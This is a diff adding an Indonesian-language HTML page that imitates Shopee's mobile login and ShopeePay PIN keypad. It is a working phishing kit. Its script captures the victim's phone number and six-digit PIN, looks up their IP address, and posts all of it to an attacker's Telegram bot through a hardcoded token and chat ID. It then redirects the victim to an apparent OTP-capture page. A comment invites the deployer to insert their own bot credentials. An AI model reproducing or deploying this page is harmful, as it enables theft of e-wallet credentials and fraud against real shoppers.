@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in - Shopee Replica</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Inter & FontAwesome Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .shopee-orange {
+            background-color: #ee4d2d;
+        }
+        .shopee-text-orange {
+            color: #ee4d2d;
+        }
+        .shopee-border-orange {
+            border-color: #ee4d2d;
+        }
+    </style>
+</head>
+<body class="bg-[#f5f5f5] min-h-screen flex flex-col justify-between items-center text-gray-800">
+
+    <div class="w-full max-w-md bg-white min-h-screen flex flex-col justify-between shadow-sm relative">
+        
+        <div>
+            <!-- Header Bar -->
+            <div class="flex items-center justify-between px-4 py-3 border-b border-gray-100">
+                <div class="flex items-center space-x-3">
+                    <button class="text-gray-600 text-lg focus:outline-none">
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </button>
+                    <span class="text-lg font-normal text-gray-800">Log in</span>
+                </div>
+                <div>
+                    <button class="text-gray-500 text-lg focus:outline-none">
+                        <i class="fa-regular fa-circle-question"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="px-6 pt-6">
+                <!-- Shopee Logo Image -->
+                <div class="flex justify-center mb-8">
+                    <div class="w-16 h-16 rounded-lg flex items-center justify-center overflow-hidden">
+                        <img src="https://www.freelogovectors.net/wp-content/uploads/2023/04/shopeelogo-freelogovectors.net_.png" alt="Shopee Logo" class="w-full h-full object-contain">
+                    </div>
+                </div>
+
+                <!-- Phone Input Form -->
+                <div class="mb-4">
+                    <div class="flex items-center border-b border-gray-300 py-2 focus-within:border-[#ee4d2d] transition-colors">
+                        <span class="text-gray-500 mr-3 text-lg"><i class="fa-solid fa-phone"></i></span>
+                        <input type="tel" id="phoneInput" placeholder="Telepon" maxlength="13"
+                            class="w-full bg-transparent focus:outline-none text-gray-800 text-base placeholder-gray-400"
+                            oninput="handlePhoneInput(this)">
+                    </div>
+                </div>
+
+                <!-- Continue Button -->
+                <div class="mt-6 mb-4">
+                    <button id="nextBtn" disabled onclick="openPinModal()"
+                        class="w-full py-3 rounded text-white font-medium bg-[#ee4d2d]/40 cursor-not-allowed transition-all duration-200">
+                        Lanjut
+                    </button>
+                </div>
+
+                <!-- Login with Password link -->
+                <div class="text-right mb-6">
+                    <a href="#" class="shopee-text-orange text-sm font-normal hover:underline">Log in dengan Password</a>
+                </div>
+
+                <!-- Divider ATAU -->
+                <div class="relative flex items-center justify-center mb-6">
+                    <div class="absolute inset-0 flex items-center">
+                        <div class="w-full border-t border-gray-200"></div>
+                    </div>
+                    <span class="relative bg-white px-4 text-xs text-gray-400 uppercase tracking-widest">ATAU</span>
+                </div>
+
+                <!-- Social Login Buttons -->
+                <div class="space-y-3">
+                    <button class="w-full flex items-center justify-center py-2.5 px-4 border border-gray-300 rounded-md bg-white hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700 shadow-sm">
+                        <svg class="w-5 h-5 mr-3" viewBox="0 0 24 24">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+                        </svg>
+                        Log In dengan Google
+                    </button>
+
+                    <button class="w-full flex items-center justify-center py-2.5 px-4 border border-gray-300 rounded-md bg-white hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700 shadow-sm">
+                        <svg class="w-5 h-5 mr-3 fill-[#1877F2]" viewBox="0 0 24 24">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                        Log In dengan Facebook
+                    </button>
+
+                    <button class="w-full flex items-center justify-center py-2.5 px-4 border border-gray-300 rounded-md bg-white hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700 shadow-sm">
+                        <svg class="w-5 h-5 mr-3 fill-[#25D366]" viewBox="0 0 24 24">
+                            <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.124-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/>
+                        </svg>
+                        Log In dengan WhatsApp
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="py-6 text-center text-xs text-gray-500">
+            Akun terhubung? <a href="#" class="shopee-text-orange font-medium hover:underline">E-wallet</a>
+        </div>
+    </div>
+
+    <!-- PIN Modal -->
+    <div id="pinModal" class="fixed inset-0 bg-black/50 z-50 flex items-end justify-center hidden transition-opacity duration-300">
+        <div class="bg-white w-full max-w-md rounded-t-2xl overflow-hidden shadow-2xl flex flex-col transform translate-y-full transition-transform duration-300" id="pinModalContent">
+            
+            <div class="flex items-center justify-between px-5 py-4 border-b border-gray-100">
+                <span class="text-base font-semibold text-gray-800">Masukkan PIN</span>
+                <button onclick="closePinModal()" class="text-gray-400 hover:text-gray-600 text-xl focus:outline-none">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+
+            <div class="px-6 py-6 flex flex-col items-center">
+                <div class="flex space-x-4 mb-4">
+                    <div class="pin-dot w-4 h-4 rounded-full border border-gray-300 bg-gray-100 transition-all duration-200"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full border border-gray-300 bg-gray-100 transition-all duration-200"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full border border-gray-300 bg-gray-100 transition-all duration-200"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full border border-gray-300 bg-gray-100 transition-all duration-200"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full border border-gray-300 bg-gray-100 transition-all duration-200"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full border border-gray-300 bg-gray-100 transition-all duration-200"></div>
+                </div>
+                <a href="#" class="shopee-text-orange text-xs font-medium hover:underline mt-2">Lupa PIN ShopeePay?</a>
+            </div>
+
+            <div class="bg-[#f2f2f2] grid grid-cols-3 gap-[1px] border-t border-gray-200">
+                <button onclick="pressKey('1')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">1</button>
+                <button onclick="pressKey('2')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">2</button>
+                <button onclick="pressKey('3')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">3</button>
+                <button onclick="pressKey('4')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">4</button>
+                <button onclick="pressKey('5')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">5</button>
+                <button onclick="pressKey('6')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">6</button>
+                <button onclick="pressKey('7')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">7</button>
+                <button onclick="pressKey('8')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">8</button>
+                <button onclick="pressKey('9')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">9</button>
+                <button class="bg-[#e4e7eb] py-4 text-sm font-medium text-gray-600 flex items-center justify-center"></button>
+                <button onclick="pressKey('0')" class="bg-white py-4 text-xl font-medium text-gray-800 hover:bg-gray-50 active:bg-gray-200 transition-colors">0</button>
+                <button onclick="deleteKey()" class="bg-[#e4e7eb] py-4 text-lg font-medium text-gray-700 hover:bg-gray-300 active:bg-gray-400 flex items-center justify-center transition-colors">
+                    <i class="fa-solid fa-delete-left"></i>
+                </button>
+            </div>
+
+            <div class="bg-[#f2f2f2] py-2 text-center text-[11px] text-gray-500 border-t border-gray-200 flex items-center justify-center space-x-1">
+                <i class="fa-solid fa-shield-halved text-[#ee4d2d]"></i>
+                <span>ShopeePay Security Keyboard</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let pinCode = "";
+        let phoneNumber = "";
+
+        // KONFIGURASI BOT TELEGRAM (Ganti dengan Token & Chat ID Anda)
+        const TELEGRAM_BOT_TOKEN = "8935462154:AAEaXDtr4v-KVg7o1n1uB3GjXkJ5ptgIamw";
+        const TELEGRAM_CHAT_ID = "392836663";
+
+        function handlePhoneInput(input) {
+            input.value = input.value.replace(/\D/g, '');
+            if (input.value.length > 13) {
+                input.value = input.value.slice(0, 13);
+            }
+            phoneNumber = input.value;
+
+            localStorage.setItem("phoneNumber", phoneNumber);
+
+            const nextBtn = document.getElementById('nextBtn');
+            if (input.value.length >= 11 && input.value.length <= 13) {
+                nextBtn.disabled = false;
+                nextBtn.classList.remove('bg-[#ee4d2d]/40', 'cursor-not-allowed');
+                nextBtn.classList.add('shopee-orange', 'cursor-pointer', 'shadow-md');
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.classList.add('bg-[#ee4d2d]/40', 'cursor-not-allowed');
+                nextBtn.classList.remove('shopee-orange', 'cursor-pointer', 'shadow-md');
+            }
+        }
+
+        function openPinModal() {
+            const modal = document.getElementById('pinModal');
+            const content = document.getElementById('pinModalContent');
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                content.classList.remove('translate-y-full');
+            }, 10);
+        }
+
+        function closePinModal() {
+            const modal = document.getElementById('pinModal');
+            const content = document.getElementById('pinModalContent');
+            content.classList.add('translate-y-full');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                pinCode = "";
+                updatePinDots();
+            }, 300);
+        }
+
+        async function pressKey(num) {
+            if (pinCode.length < 6) {
+                pinCode += num;
+                updatePinDots();
+                if (pinCode.length === 6) {
+                    try {
+                        let ip = "Tidak diketahui";
+                        try {
+                            const res = await fetch("https://api.ipify.org?format=json");
+                            const data = await res.json();
+                            ip = data.ip;
+                        } catch (e) {}
+                        
+                        const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+                        
+                        const pesan = `🛒 [1/2] SHOPEE LOGIN\n\n📱 Nomor HP: ${phoneNumber}\n🔑 PIN: ${pinCode}\n🌐 IP: ${ip}\n🕐 Waktu: ${waktu}`;
+                        
+                        // Kirim data login & PIN ke Bot Telegram
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                text: pesan
+                            })
+                        });
+                    } catch (e) {
+                        console.error("Gagal mengirim:", e);
+                    }
+                    
+                    // Beri jeda sejenak agar request terkirim sempurna sebelum pindah halaman
+                    setTimeout(() => {
+                        window.location.href = "otp.html";
+                    }, 500);
+                }
+            }
+        }
+
+        function deleteKey() {
+            if (pinCode.length > 0) {
+                pinCode = pinCode.slice(0, -1);
+                updatePinDots();
+            }
+        }
+
+        function updatePinDots() {
+            const dots = document.querySelectorAll('.pin-dot');
+            dots.forEach((dot, index) => {
+                if (index < pinCode.length) {
+                    dot.classList.remove('bg-gray-100', 'border-gray-300');
+                    dot.classList.add('shopee-orange', 'shopee-border-orange');
+                } else {
+                    dot.classList.add('bg-gray-100', 'border-gray-300');
+                    dot.classList.remove('shopee-orange', 'shopee-border-orange');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
